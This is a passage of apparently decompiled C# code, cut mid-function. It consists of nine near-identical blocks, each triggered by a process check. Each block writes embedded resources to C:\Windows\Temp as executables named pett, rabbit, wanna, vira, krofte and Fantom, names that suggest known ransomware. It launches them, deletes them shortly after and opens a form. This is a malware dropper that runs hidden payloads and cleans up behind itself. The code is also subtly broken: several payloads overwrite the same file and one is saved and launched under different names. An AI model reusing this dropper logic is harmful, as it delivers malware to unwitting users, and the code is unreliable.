				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName20.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName21.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName22.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName23.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName24.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName25.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName26.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName27.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\wanna.exe", Resource4.wanna);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\aaaa.exe", Resource5.vira);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource6.krofte);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\pett.exe", Resource7.Fantom);
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\pett.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\rabbit.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\wanna.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\vira.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\krofte.exe", Conversions.ToString(true));
			Thread.Sleep(100);
			Process.Start("C:\\Windows\\Temp\\Fantom.exe", Conversions.ToString(true));
			Thread.Sleep(2000);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			((Control)MyProject.Forms.Form2).Show();
		}
		if (processesByName28.Length > 0)
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\pett.exe"))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\pett.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\rabbit.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\wanna.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\vira.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\krofte.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:\\Windows\\Temp\\Fantom.exe");
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Windows\\Temp\\Fantom.exe");
			}
			save("C:\\Windows\\Temp\\pett.exe", Resource2.pett);
			Thread.Sleep(100);
			save("C:\\Windows\\Temp\\rabbit.exe", Resource3.rabbit);
			Thread.Sleep(100);
